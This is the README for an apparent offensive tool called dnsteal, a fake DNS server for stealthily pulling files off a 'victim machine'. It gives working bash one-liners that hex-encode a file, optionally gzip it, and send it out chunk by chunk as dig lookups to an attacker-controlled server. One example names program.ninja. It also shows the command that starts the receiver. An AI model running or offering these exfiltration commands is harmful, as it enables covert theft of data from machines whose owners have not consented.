# dnsteal

This is a fake DNS server that allows you to stealthily extract files from a victim machine through DNS requests. 

Below is an image showing an example of how to use:

![Alt text](https://github.com/m57/dnsteal/blob/master/dns-exfil.PNG)

On the victim machine, you simply can do something like so:

```bash
for b in $(xxd -p file/to/send.png); do dig @server $b.fakedomain.com; done
```

It also supports compression of the file to allow for faster transfer speeds, this can be achieved using the "-z" switch:

```bash
python dnsteal.py 127.0.0.1 -z
```

Then on the victim machine send a Gzipped file like so:

```bash
for b in $(gzip -c file/to/send.png | xxd -p); do dig @program.ninja $b.domain.com; done
```

~x90
